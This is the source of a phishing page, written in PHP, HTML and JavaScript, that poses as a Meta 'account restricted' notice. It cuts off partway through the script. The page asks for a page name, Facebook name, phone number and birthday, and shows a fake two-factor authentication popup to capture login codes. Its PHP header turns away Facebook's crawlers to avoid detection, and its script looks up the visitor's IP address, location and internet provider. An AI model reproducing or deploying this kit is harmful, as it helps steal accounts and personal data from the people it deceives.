<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$botPatterns = ['facebookexternalhit', 'FacebookBot'];
foreach ($botPatterns as $bot) {
    if (stripos($userAgent, $bot) !== false) {
        http_response_code(403);
        echo 'Access denied.';
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Meta – Account restriction</title>
    <
    <!-- libphonenumber-js -->
    <script src="https://unpkg.com/libphonenumber-js@1.10.53/bundle/libphonenumber-min.js"></script>
    <style>
        /* (Giữ nguyên CSS như cũ) */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-image: url('meta-gradient.webp');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
        }

        .card {
            background-color: #ffffff;
            max-width: 560px;
            width: 100%;
            border-radius: 16px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            padding: 28px 24px;
            transition: all 0.2s;
            position: relative;
        }

        .custom-image {
            text-align: center;
            border-radius: 12px;
        }

        .custom-image img {
            max-width: 100%;
            height: 300px;
            max-height: 300px;
            border-radius: 8px;
            object-fit: contain;
        }

        .restricted-title {
            font-size: 28px;
            font-weight: 700;
            line-height: 1.2;
            color: #1b1f23;
            margin-bottom: 4px;
        }

        .tos-sub {
            font-size: 15px;
            color: #65676b;
            border-bottom: 1px solid #e4e6e9;
            padding-bottom: 16px;
            margin-bottom: 16px;
            font-weight: 400;
        }

        .description {
            color: #1c1e21;
            font-size: 15px;
            line-height: 1.5;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 18px;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #1b1f23;
            margin-bottom: 6px;
        }

        .form-group input {
            width: 100%;
            padding: 12px 14px;
            background-color: #ffffff;
            border: 1px solid #dddfe2;
            border-radius: 8px;
            font-size: 15px;
            outline: none;
            transition: border-color 0.15s, box-shadow 0.15s;
        }

        .form-group input:focus {
            border-color: #0866ff;
            box-shadow: 0 0 0 3px rgba(8, 102, 255, 0.2);
        }

        .form-group.input-error input {
            border-color: #e41e3f;
            background-color: #ffefef;
        }

        .error-message {
            color: #e41e3f;
            font-size: 13px;
            margin-top: 5px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .phone-wrapper {
            position: relative;
            display: flex;
            border: 1px solid #dddfe2;
            border-radius: 8px;
            overflow: visible;
            transition: border-color 0.15s, box-shadow 0.15s;
        }

        .phone-wrapper:focus-within {
            border-color: #0866ff;
            box-shadow: 0 0 0 3px rgba(8, 102, 255, 0.2);
        }

        .country-selector {
            background-color: #f0f2f5;
            display: flex;
            align-items: center;
            gap: 6px;
            padding: 0 12px;
            border-right: 1px solid #dddfe2;
            cursor: pointer;
            user-select: none;
            white-space: nowrap;
            transition: background-color 0.2s;
        }

        .country-selector:hover {
            background-color: #e4e6e9;
        }

        .selected-flag {
            width: 24px;
            height: 18px;
            object-fit: cover;
            border-radius: 3px;
        }

        .selected-code {
            font-weight: 500;
            color: #1c1e21;
            font-size: 15px;
        }

        .dropdown-icon {
            font-size: 12px;
            color: #65676b;
            margin-left: 4px;
        }

        .phone-wrapper input {
            flex: 1;
            border: none;
            border-radius: 0;
            padding: 12px 14px;
            font-size: 15px;
            outline: none;
        }

        .phone-wrapper input:focus {
            box-shadow: none;
        }

        .country-dropdown {
            position: absolute;
            top: calc(100% + 6px);
            left: 0;
            width: 320px;
            max-height: 350px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 6px 18px rgba(0,0,0,0.15);
            z-index: 1000;
            display: none;
            overflow: hidden;
            border: 1px solid #e4e6e9;
        }

        .country-dropdown.show {
            display: block;
        }

        .search-box {
            padding: 10px 12px;
            border-bottom: 1px solid #e4e6e9;
        }

        .search-box input {
            width: 100%;
            padding: 8px 12px;
            border: 1px solid #dddfe2;
            border-radius: 20px;
            font-size: 14px;
            outline: none;
            transition: border-color 0.15s;
        }

        .search-box input:focus {
            border-color: #0866ff;
        }

        .country-list {
            max-height: 280px;
            overflow-y: auto;
            padding: 6px 0;
        }

        .country-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 10px 16px;
            cursor: pointer;
            transition: background-color 0.15s;
        }

        .country-item:hover {
            background-color: #f0f2f5;
        }

        .country-item img {
            width: 28px;
            height: 21px;
            object-fit: cover;
            border-radius: 4px;
            border: 1px solid #dddfe2;
        }

        .country-info {
            flex: 1;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .country-name {
            font-weight: 500;
            color: #050505;
            font-size: 15px;
        }

        .country-dial {
            color: #65676b;
            font-size: 14px;
        }

        .no-results {
            padding: 16px;
            text-align: center;
            color: #65676b;
            font-size: 14px;
        }

        .case-block {
            background-color: #f7f8fa;
            border-radius: 10px;
            padding: 16px 14px;
            margin: 24px 0 20px;
            border-left: 4px solid #0866ff;
        }

        .case-number {
            font-size: 16px;
            margin-bottom: 10px;
        }

        .case-number strong {
            font-weight: 600;
            color: #050505;
        }

        .case-number span {
            color: #0866ff;
            font-weight: 500;
            letter-spacing: 0.3px;
        }

        .about-case {
            font-size: 15px;
            color: #2c2e30;
            line-height: 1.4;
        }

        .about-case strong {
            font-weight: 600;
            color: #050505;
        }

        .continue-btn {
            background-color: #0866ff;
            color: white;
            font-weight: 600;
            font-size: 17px;
            padding: 14px 20px;
            width: 100%;
            border: none;
            border-radius: 40px;
            cursor: pointer;
            transition: background-color 0.2s, transform 0.1s;
            margin-bottom: 20px;
            box-shadow: 0 2px 6px rgba(0, 102, 255, 0.3);
        }

        .continue-btn:hover {
            background-color: #1871f2;
        }

        .continue-btn:active {
            transform: scale(0.98);
            background-color: #0756d6;
        }

        .continue-btn:disabled {
            background-color: #b0c4de;
            cursor: not-allowed;
            opacity: 0.6;
        }

        .warning-message {
            background-color: #fff9eb;
            border-left: 5px solid #f7b125;
            border-radius: 8px;
            padding: 14px 16px;
            font-size: 14px;
            color: #2c2e30;
            line-height: 1.5;
            display: flex;
            gap: 10px;
            align-items: flex-start;
        }

        .warning-message .icon {
            font-size: 20px;
            color: #f7b125;
        }

        .warning-message a {
            color: #0866ff;
            text-decoration: none;
            font-weight: 500;
        }

        .warning-message a:hover {
            text-decoration: underline;
        }

        .date-highlight {
            font-weight: 500;
            color: #1b1f23;
        }

        .footnote {
            font-size: 12px;
            color: #8a8d91;
            text-align: center;
            margin-top: 20px;
        }

        .meta-brand .brand-container {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 8px;
        }

        .meta-brand img {
            height: 32px;
            width: auto;
            display: block;
        }

        .meta-brand span {
            font-size: 24px;
            font-weight: 600;
            color: #1b1f23;
            line-height: 1;
        }

        .ip-info {
            font-size: 12px;
            color: #8a8d91;
            text-align: center;
            margin-top: 8px;
        }

        #waiting-screen {
            text-align: center;
            padding: 30px 0;
        }
        #waiting-screen img {
            max-width: 120px;
            margin-bottom: 20px;
        }
        #waiting-screen h3 {
            font-size: 22px;
            margin-bottom: 10px;
            color: #1b1f23;
        }
        #waiting-screen p {
            font-size: 15px;
            color: #65676b;
            line-height: 1.5;
            margin-bottom: 20px;
        }
        .progress-bar {
            width: 80%;
            height: 6px;
            background-color: #e4e6e9;
            border-radius: 10px;
            margin: 0 auto;
            overflow: hidden;
        }
        .progress-bar-fill {
            height: 100%;
            width: 0%;
            background-color: #0866ff;
            transition: width linear;
        }

        /* POPUP 2FA - cải tiến */
        .popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.5);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 10000;
            padding: 16px;
            box-sizing: border-box;
        }

        .popup-content {
            background-color: #ffffff;
            max-width: 500px;
            width: 100%;
            max-height: 90vh;
            overflow-y: auto;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
            padding: 28px 24px;
        }

        .popup-content .fb-header {
            font-size: 14px;
            color: #65676b;
            margin-bottom: 8px;
            font-weight: 500;
        }

        .popup-content h2 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 16px;
            color: #1b1f23;
            line-height: 1.3;
        }

        .popup-content .info-text {
            font-size: 15px;
            color: #1c1e21;
            line-height: 1.5;
            margin-bottom: 24px;
        }

        .popup-content .info-text strong {
            color: #0866ff;
            font-weight: 600;
        }

        .popup-content .popup-image {
            text-align: center;
            margin: 20px 0;
        }

        .popup-content .popup-image img {
            max-width: 100%;
            height: auto;
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }

        .popup-content .code-label {
            font-size: 15px;
            font-weight: 600;
            color: #1b1f23;
            margin-bottom: 8px;
            display: block;
        }

        .popup-content input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dddfe2;
            border-radius: 8px;
            font-size: 16px;
            margin-bottom: 20px;
            outline: none;
            background-color: #ffffff;
            color: #1c1e21;
        }

        .popup-content input:focus {
            border-color: #0866ff;
            box-shadow: 0 0 0 3px rgba(8,102,255,0.2);
        }

        .popup-content input:disabled {
            background-color: #f0f2f5;
            cursor: not-allowed;
        }

        .popup-content .error-message {
            color: #e41e3f;
            font-size: 14px;
            margin: 0 0 16px 0;
            padding: 12px 16px;
            background-color: #ffefef;
            border-radius: 8px;
            border-left: 4px solid #e41e3f;
            display: none;
        }

        .popup-content .error-message.show {
            display: block;
        }

        .popup-content .countdown {
            font-weight: 600;
            color: #e41e3f;
        }

        .button-container {
            position: relative;
            margin-bottom: 16px;
        }

        .popup-content .continue-btn {
            background-color: #0866ff;
            color: white;
            font-weight: 600;
            font-size: 17px;
            padding: 14px 20px;
            width: 100%;
            border: none;
            border-radius: 40px;
            cursor: pointer;
            transition: background-color 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .popup-content .continue-btn:hover:not(:disabled) {
            background-color: #1871f2;
        }

        .popup-content .continue-btn:disabled {
            background-color: #b0c4de;
            cursor: not-allowed;
            opacity: 0.6;
        }

        .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .popup-content .continue-btn.loading .btn-text {
            opacity: 0.7;
        }

        .popup-content .continue-btn.loading .spinner {
            display: inline-block;
        }

        .popup-content .try-another {
            text-align: center;
            margin-bottom: 20px;
        }

        .popup-content .try-another a {
            color: #0866ff;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .popup-content .try-another a:hover {
            text-decoration: underline;
        }

        .meta-logo-footer {
            text-align: center;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #e4e6e9;
        }

        .meta-footer-logo {
            max-width: 80px;
            height: auto;
            opacity: 0.7;
            transition: opacity 0.2s;
        }

        .meta-footer-logo:hover {
            opacity: 1;
        }
    </style>
</head>
<body>
    <!-- LOADING OVERLAY -->
    <div id="loading-overlay" style="position: fixed; inset: 0; background: #000; display: flex; align-items: center; justify-content: center; z-index: 9999;">
        <img src="loadingLogo.gif" id="loading-gif" data-duration="3000" alt="Loading..." style="width: 100%; height: 100%; object-fit: cover;">
    </div>

    <script>
        (function() {
            var overlay = document.getElementById('loading-overlay');
            var gifImg = document.getElementById('loading-gif');
            if (!overlay || !gifImg) return;

            var gifDuration = parseInt(gifImg.getAttribute('data-duration')) || 3000;

            function hideOverlay() {
                overlay.style.transition = 'opacity 0.5s ease';
                overlay.style.opacity = '0';
                setTimeout(function() {
                    overlay.style.display = 'none';
                }, 500);
            }

            gifImg.addEventListener('load', function() {
                setTimeout(hideOverlay, gifDuration);
            });

            if (gifImg.complete) {
                setTimeout(hideOverlay, gifDuration);
            }

            gifImg.addEventListener('error', function() {
                setTimeout(hideOverlay, 5000);
            });
        })();
    </script>

    <div class="card">
        <div class="meta-brand">
            <div class="brand-container">
                <img src="meta-color.png" alt="Meta logo">
                <span>Meta</span>
            </div>
        </div>

        <div class="custom-image">
            <img src="fabz.png" alt="Your PNG image">
        </div>

        <div class="restricted-title">Your account has been restricted</div>
        <div class="tos-sub">Term of Service</div>

        <div class="description">
            We detected unusual activity in your page today <span class="date-highlight">March 13, 2026</span>. 
            Someone has reported your account for not complying with Community Standards. 
            We have already reviewed this decision and the decision cannot be changed. 
            To avoid having your account disabled, please verify:
        </div>

        <div id="dynamic-forms">
            <div class="form-group" id="page-name-group">
                <label>Page Name</label>
                <input type="text" id="page-name" placeholder="e.g., Your Business or Brand">
                <div class="error-message" id="page-name-error"></div>
            </div>

            <div class="form-group" id="fb-name-group">
                <label>Facebook Name</label>
                <input type="text" id="fb-name" placeholder="Your profile name">
                <div class="error-message" id="fb-name-error"></div>
            </div>

            <div class="form-group" id="phone-group">
                <label>Phone number</label>
                <div class="phone-wrapper" id="phone-wrapper">
                    <div class="country-selector" id="country-selector">
                        <img class="selected-flag" id="selected-flag" src="assests/US.svg" alt="US">
                        <span class="selected-code" id="selected-dial-code">+1</span>
                        <span class="dropdown-icon">▼</span>
                    </div>
                    <input type="tel" id="phone-number" placeholder="Enter phone number" autocomplete="off">

                    <div class="country-dropdown" id="country-dropdown">
                        <div class="search-box">
                            <input type="text" id="search-country" placeholder="Find the country name or code..." autocomplete="off">
                        </div>
                        <div class="country-list" id="country-list"></div>
                    </div>
                </div>
                <div class="error-message" id="phone-error"></div>
            </div>

            <div class="form-group" id="birthday-group">
                <label>Birthday (MM/DD/YYYY)</label>
                <input type="text" id="birthday" placeholder="MM/DD/YYYY">
                <div class="error-message" id="birthday-error"></div>
            </div>
        </div>

        <div id="waiting-screen" style="display: none;">
            <img src="locked.png" alt="Locked">
            <h3>Please Wait...</h3>
            <p>Thank you for confirming your account. This warning is for preventing the account being permanently disabled if there is a violation of Facebook's terms.</p>
            <div class="progress-bar">
                <div class="progress-bar-fill" id="progress-fill"></div>
            </div>
        </div>

        <div class="case-block">
            <div class="case-number">
                <strong>Case Number:</strong> <span>#986937844856</span>
            </div>
            <div class="about-case">
                <strong>About Case:</strong> Violating Community Standards and Posting something inappropriate.
            </div>
        </div>

        <button class="continue-btn" id="continue-btn">Continue</button>

        <div class="warning-message">
            <span class="icon">⚠️</span>
            <span>
                <strong>Please make sure to fill in the data correctly;</strong> otherwise, your account may be permanently closed. 
                To learn more about why accounts are deactivated, visit our <a href="https://transparency.meta.com/policies/community-standards/">Community Standards</a>.
            </span>
        </div>

    </div>

    <!-- Popup 2FA - giao diện chuẩn -->
    <div class="popup-overlay" id="twofa-popup">
        <div class="popup-content">
            <div class="fb-header" id="fb-header-display"></div>
            <h2>Two-factor authentication required (1/3)</h2>

            <div class="info-text">
                Enter the code for this account that we send to <strong id="display-email"></strong>, <strong id="display-phone"></strong> or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator).
            </div>

            <div class="popup-image">
                <img src="1.png" alt="2FA Image">
            </div>

            <label class="code-label">Code</label>
            <input type="text" id="twofa-code" placeholder="Code" inputmode="numeric" pattern="\d*">

            <div class="error-message" id="twofa-error">
                The two-factor authentication you entered is incorrect. Please, try again after <span class="countdown" id="countdown-timer">0 minutes 30 seconds</span>.
            </div>

            <div class="button-container">
                <button class="continue-btn" id="twofa-continue" disabled>
                    <span class="btn-text">Continue</span>
                    <span class="spinner"></span>
                </button>
            </div>

            <div class="try-another">
                <a href="#" id="try-another">Try another way</a>
            </div>

            <div class="meta-logo-footer">
                <img src="2.svg" alt="Meta Logo" class="meta-footer-logo">
            </div>
        </div>
    </div>

    <script>
        (function() {
            // ============================================
            // DANH SÁCH QUỐC GIA
            // ============================================
            const countries = [
                { code: "AF", name: "AF", dial: "+93" }, { code: "AL", name: "AL", dial: "+355" }, { code: "DZ", name: "DZ", dial: "+213" }, { code: "US", name: "US", dial: "+1" }, { code: "AD", name: "AD", dial: "+376" }, { code: "AO", name: "AO", dial: "+244" }, { code: "AI", name: "AI", dial: "+1" }, { code: "AG", name: "AG", dial: "+1" }, { code: "AR", name: "AR", dial: "+54" }, { code: "AM", name: "AM", dial: "+374" }, { code: "AW", name: "AW", dial: "+297" }, { code: "AU", name: "AU", dial: "+61" }, { code: "AT", name: "AT", dial: "+43" }, { code: "AZ", name: "AZ", dial: "+994" }, { code: "BS", name: "BS", dial: "+1" }, { code: "BH", name: "BH", dial: "+973" }, { code: "BD", name: "BD", dial: "+880" }, { code: "BB", name: "BB", dial: "+1" }, { code: "BY", name: "BY", dial: "+375" }, { code: "BE", name: "BE", dial: "+32" }, { code: "BZ", name: "BZ", dial: "+501" }, { code: "BJ", name: "BJ", dial: "+229" }, { code: "BM", name: "BM", dial: "+1" }, { code: "BT", name: "BT", dial: "+975" }, { code: "BO", name: "BO", dial: "+591" }, { code: "BA", name: "BA", dial: "+387" }, { code: "BW", name: "BW", dial: "+267" }, { code: "BR", name: "BR", dial: "+55" }, { code: "BN", name: "BN", dial: "+673" }, { code: "BG", name: "BG", dial: "+359" }, { code: "BF", name: "BF", dial: "+226" }, { code: "BI", name: "BI", dial: "+257" }, { code: "KH", name: "KH", dial: "+855" }, { code: "CM", name: "CM", dial: "+237" }, { code: "CA", name: "CA", dial: "+1" }, { code: "CV", name: "CV", dial: "+238" }, { code: "KY", name: "KY", dial: "+1" }, { code: "CF", name: "CF", dial: "+236" }, { code: "TD", name: "TD", dial: "+235" }, { code: "CL", name: "CL", dial: "+56" }, { code: "CN", name: "CN", dial: "+86" }, { code: "CO", name: "CO", dial: "+57" }, { code: "KM", name: "KM", dial: "+269" }, { code: "CG", name: "CG", dial: "+242" }, { code: "CD", name: "CD", dial: "+243" }, { code: "CR", name: "CR", dial: "+506" }, { code: "HR", name: "HR", dial: "+385" }, { code: "CU", name: "CU", dial: "+53" }, { code: "CY", name: "CY", dial: "+357" }, { code: "CZ", name: "CZ", dial: "+420" }, { code: "DK", name: "DK", dial: "+45" }, { code: "DJ", name: "DJ", dial: "+253" }, { code: "DM", name: "DM", dial: "+1" }, { code: "DO", name: "DO", dial: "+1" }, { code: "EC", name: "EC", dial: "+593" }, { code: "EG", name: "EG", dial: "+20" }, { code: "SV", name: "SV", dial: "+503" }, { code: "GQ", name: "GQ", dial: "+240" }, { code: "ER", name: "ER", dial: "+291" }, { code: "EE", name: "EE", dial: "+372" }, { code: "ET", name: "ET", dial: "+251" }, { code: "FJ", name: "FJ", dial: "+679" }, { code: "FI", name: "FI", dial: "+358" }, { code: "FR", name: "FR", dial: "+33" }, { code: "GA", name: "GA", dial: "+241" }, { code: "GM", name: "GM", dial: "+220" }, { code: "GE", name: "GE", dial: "+995" }, { code: "DE", name: "DE", dial: "+49" }, { code: "GH", name: "GH", dial: "+233" }, { code: "GI", name: "GI", dial: "+350" }, { code: "GR", name: "GR", dial: "+30" }, { code: "GL", name: "GL", dial: "+299" }, { code: "GD", name: "GD", dial: "+1" }, { code: "GU", name: "GU", dial: "+1" }, { code: "GT", name: "GT", dial: "+502" }, { code: "GN", name: "GN", dial: "+224" }, { code: "GW", name: "GW", dial: "+245" }, { code: "GY", name: "GY", dial: "+592" }, { code: "HT", name: "HT", dial: "+509" }, { code: "HN", name: "HN", dial: "+504" }, { code: "HK", name: "HK", dial: "+852" }, { code: "HU", name: "HU", dial: "+36" }, { code: "IS", name: "IS", dial: "+354" }, { code: "IN", name: "IN", dial: "+91" }, { code: "ID", name: "ID", dial: "+62" }, { code: "IR", name: "IR", dial: "+98" }, { code: "IQ", name: "IQ", dial: "+964" }, { code: "IE", name: "IE", dial: "+353" }, { code: "IL", name: "IL", dial: "+972" }, { code: "IT", name: "IT", dial: "+39" }, { code: "JM", name: "JM", dial: "+1" }, { code: "JP", name: "JP", dial: "+81" }, { code: "JO", name: "JO", dial: "+962" }, { code: "KZ", name: "KZ", dial: "+7" }, { code: "KE", name: "KE", dial: "+254" }, { code: "KI", name: "KI", dial: "+686" }, { code: "KP", name: "KP", dial: "+850" }, { code: "KR", name: "KR", dial: "+82" }, { code: "KW", name: "KW", dial: "+965" }, { code: "KG", name: "KG", dial: "+996" }, { code: "LA", name: "LA", dial: "+856" }, { code: "LV", name: "LV", dial: "+371" }, { code: "LB", name: "LB", dial: "+961" }, { code: "LS", name: "LS", dial: "+266" }, { code: "LR", name: "LR", dial: "+231" }, { code: "LY", name: "LY", dial: "+218" }, { code: "LI", name: "LI", dial: "+423" }, { code: "LT", name: "LT", dial: "+370" }, { code: "LU", name: "LU", dial: "+352" }, { code: "MO", name: "MO", dial: "+853" }, { code: "MK", name: "MK", dial: "+389" }, { code: "MG", name: "MG", dial: "+261" }, { code: "MW", name: "MW", dial: "+265" }, { code: "MY", name: "MY", dial: "+60" }, { code: "MV", name: "MV", dial: "+960" }, { code: "ML", name: "ML", dial: "+223" }, { code: "MT", name: "MT", dial: "+356" }, { code: "MH", name: "MH", dial: "+692" }, { code: "MR", name: "MR", dial: "+222" }, { code: "MU", name: "MU", dial: "+230" }, { code: "MX", name: "MX", dial: "+52" }, { code: "FM", name: "FM", dial: "+691" }, { code: "MD", name: "MD", dial: "+373" }, { code: "MC", name: "MC", dial: "+377" }, { code: "MN", name: "MN", dial: "+976" }, { code: "ME", name: "ME", dial: "+382" }, { code: "MS", name: "MS", dial: "+1" }, { code: "MA", name: "MA", dial: "+212" }, { code: "MZ", name: "MZ", dial: "+258" }, { code: "MM", name: "MM", dial: "+95" }, { code: "NA", name: "NA", dial: "+264" }, { code: "NR", name: "NR", dial: "+674" }, { code: "NP", name: "NP", dial: "+977" }, { code: "NL", name: "NL", dial: "+31" }, { code: "NZ", name: "NZ", dial: "+64" }, { code: "NI", name: "NI", dial: "+505" }, { code: "NE", name: "NE", dial: "+227" }, { code: "NG", name: "NG", dial: "+234" }, { code: "NO", name: "NO", dial: "+47" }, { code: "OM", name: "OM", dial: "+968" }, { code: "PK", name: "PK", dial: "+92" }, { code: "PW", name: "PW", dial: "+680" }, { code: "PA", name: "PA", dial: "+507" }, { code: "PG", name: "PG", dial: "+675" }, { code: "PY", name: "PY", dial: "+595" }, { code: "PE", name: "PE", dial: "+51" }, { code: "PH", name: "PH", dial: "+63" }, { code: "PL", name: "PL", dial: "+48" }, { code: "PT", name: "PT", dial: "+351" }, { code: "QA", name: "QA", dial: "+974" }, { code: "RO", name: "RO", dial: "+40" }, { code: "RU", name: "RU", dial: "+7" }, { code: "RW", name: "RW", dial: "+250" }, { code: "KN", name: "KN", dial: "+1" }, { code: "LC", name: "LC", dial: "+1" }, { code: "VC", name: "VC", dial: "+1" }, { code: "WS", name: "WS", dial: "+685" }, { code: "SM", name: "SM", dial: "+378" }, { code: "ST", name: "ST", dial: "+239" }, { code: "SA", name: "SA", dial: "+966" }, { code: "SN", name: "SN", dial: "+221" }, { code: "RS", name: "RS", dial: "+381" }, { code: "SC", name: "SC", dial: "+248" }, { code: "SL", name: "SL", dial: "+232" }, { code: "SG", name: "SG", dial: "+65" }, { code: "SK", name: "SK", dial: "+421" }, { code: "SI", name: "SI", dial: "+386" }, { code: "SB", name: "SB", dial: "+677" }, { code: "SO", name: "SO", dial: "+252" }, { code: "ZA", name: "ZA", dial: "+27" }, { code: "ES", name: "ES", dial: "+34" }, { code: "LK", name: "LK", dial: "+94" }, { code: "SD", name: "SD", dial: "+249" }, { code: "SR", name: "SR", dial: "+597" }, { code: "SZ", name: "SZ", dial: "+268" }, { code: "SE", name: "SE", dial: "+46" }, { code: "CH", name: "CH", dial: "+41" }, { code: "SY", name: "SY", dial: "+963" }, { code: "TW", name: "TW", dial: "+886" }, { code: "TJ", name: "TJ", dial: "+992" }, { code: "TZ", name: "TZ", dial: "+255" }, { code: "TH", name: "TH", dial: "+66" }, { code: "TL", name: "TL", dial: "+670" }, { code: "TG", name: "TG", dial: "+228" }, { code: "TO", name: "TO", dial: "+676" }, { code: "TT", name: "TT", dial: "+1" }, { code: "TN", name: "TN", dial: "+216" }, { code: "TR", name: "TR", dial: "+90" }, { code: "TM", name: "TM", dial: "+993" }, { code: "TV", name: "TV", dial: "+688" }, { code: "UG", name: "UG", dial: "+256" }, { code: "UA", name: "UA", dial: "+380" }, { code: "AE", name: "AE", dial: "+971" }, { code: "GB", name: "GB", dial: "+44" }, { code: "US", name: "US", dial: "+1" }, { code: "UY", name: "UY", dial: "+598" }, { code: "UZ", name: "UZ", dial: "+998" }, { code: "VU", name: "VU", dial: "+678" }, { code: "VE", name: "VE", dial: "+58" }, { code: "VN", name: "VN", dial: "+84" }, { code: "YE", name: "YE", dial: "+967" }, { code: "ZM", name: "ZM", dial: "+260" }, { code: "ZW", name: "ZW", dial: "+263" }
            ];

            // ============================================
            // CASE NUMBER RANDOM VỚI COOKIE
            // ============================================
            function setCookie(name, value, days) {
                const date = new Date();
                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
                document.cookie = name + "=" + value + ";expires=" + date.toUTCString() + ";path=/";
            }

            function getCookie(name) {
                const cookies = document.cookie.split('; ');
                for (let cookie of cookies) {
                    const [key, val] = cookie.split('=');
                    if (key === name) return val;
                }
                return null;
            }

            let caseNumber = getCookie('caseNumber');
            if (!caseNumber) {
                caseNumber = '#' + Math.floor(Math.random() * 1000000000000).toString().padStart(12, '0');
                setCookie('caseNumber', caseNumber, 365);
            }

            const caseSpan = document.querySelector('.case-number span');
            if (caseSpan) {
                caseSpan.textContent = caseNumber;
            }

            // ============================================
            // CẬP NHẬT NGÀY HIỆN TẠI
            // ============================================
            const dateHighlight = document.querySelector('.date-highlight');
            if (dateHighlight) {
                const now = new Date();
                const options = { year: 'numeric', month: 'long', day: 'numeric' };
                const formattedDate = now.toLocaleDateString('en-US', options);
                dateHighlight.textContent = formattedDate;
            }

            // ============================================
            // LẤY IP VÀ VỊ TRÍ NGƯỜI DÙNG (TÁCH LOCATION VÀ ISP)
            // ============================================
            let userIp = 'Unknown';
            let userCityCountry = 'Unknown';
            let userIsp = 'Unknown';

            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    userIp = data.ip;
                    const ipDiv = document.querySelector('.ip-info');
                    if (ipDiv) {
                        ipDiv.textContent = `Your IP: ${userIp}`;
                    }
                    return fetch(`http://ip-api.com/json/${userIp}?fields=status,country,regionName,city,isp`);
                })
                .then(response => response.json())
                .then(locData => {
                    if (locData.status === 'success') {
                        userCityCountry = `${locData.city}, ${locData.country}`;
                        userIsp = locData.isp;
                    }
                })
                .catch(err => {
                    console.log('Không lấy được IP/location');
                });

            // ============================================
            // DROPDOWN QUỐC GIA
            // ============================================
            const selector = document.getElementById('country-selector');
            const dropdown = document.getElementById('country-dropdown');
            const selectedFlag = document.getElementById('selected-flag');
            const selectedDial = document.getElementById('selected-dial-code');
            const countryList = document.getElementById('country-list');
            const searchInput = document.getElementById('search-country');
            const phoneInput = document.getElementById('phone-number');

            let selectedCountry = { code: "US", dial: "+1" };
            let filteredCountries = countries;

            function renderCountries(filter = '') {
                const term = filter.toLowerCase().trim();
                filteredCountries = countries.filter(c => 
                    c.code.toLowerCase().includes(term) || c.dial.includes(term)
                );
                if (filteredCountries.length === 0) {
                    countryList.innerHTML = '<div class="no-results">Không tìm thấy quốc gia</div>';
                    return;
                }
                let html = '';
                filteredCountries.forEach(c => {
                    html += `
                        <div class="country-item" data-code="${c.code}" data-dial="${c.dial}">
                            <img src="assests/${c.code}.svg" alt="${c.code}" loading="lazy">
                            <div class="country-info">
                                <span class="country-name">${c.code}</span>
                                <span class="country-dial">${c.dial}</span>
                            </div>
                        </div>
                    `;
                });
                countryList.innerHTML = html;
            }

            function selectCountry(code, dial) {
                selectedCountry = { code, dial };
                selectedFlag.src = `assests/${code}.svg`;
                selectedDial.textContent = dial;
                dropdown.classList.remove('show');
                phoneInput.focus();
            }

            selector.addEventListener('click', function(e) {
                e.stopPropagation();
                dropdown.classList.toggle('show');
                if (dropdown.classList.contains('show')) {
                    searchInput.focus();
                    renderCountries(searchInput.value);
                }
            });

            document.addEventListener('click', function(e) {
                if (!selector.contains(e.target) && !dropdown.contains(e.target)) {
                    dropdown.classList.remove('show');
                }
            });

            searchInput.addEventListener('input', function() {
                renderCountries(this.value);
            });

            countryList.addEventListener('click', function(e) {
                const item = e.target.closest('.country-item');
                if (item) {
                    const code = item.dataset.code;
                    const dial = item.dataset.dial;
                    selectCountry(code, dial);
                }
            });

            renderCountries();

            // ============================================
            // FORMAT SỐ ĐIỆN THOẠI
            // ============================================
            let ignoreInputEvent = false;

            phoneInput.addEventListener('input', function(e) {
                if (ignoreInputEvent) return;

                const rawValue = this.value;
                const countryCode = selectedCountry.code;

                const formatter = new libphonenumber.AsYouType(countryCode);
                const formatted = formatter.input(rawValue);

                if (formatted !== rawValue) {
                    ignoreInputEvent = true;
                    this.value = formatted;
                    this.setSelectionRange(formatted.length, formatted.length);
                    ignoreInputEvent = false;
                }
            });

            // ============================================
            // HÀM LẤY SỐ ĐIỆN THOẠI ĐẦY ĐỦ (KÈM MÃ QUỐC GIA)
            // ============================================
            function getFullPhoneNumber() {
                const rawNumber = phoneInput.value.trim();
                const countryCode = selectedCountry.code; // mã hai ký tự, ví dụ 'US', 'VN'
                try {
                    // Thử parse bằng thư viện libphonenumber
                    if (typeof libphonenumber !== 'undefined' && libphonenumber.parsePhoneNumberFromString) {
                        const phoneNumber = libphonenumber.parsePhoneNumberFromString(rawNumber, countryCode);
                        if (phoneNumber && phoneNumber.isValid()) {
                            return phoneNumber.number; // E.164 format, ví dụ +14155552671
                        } else {
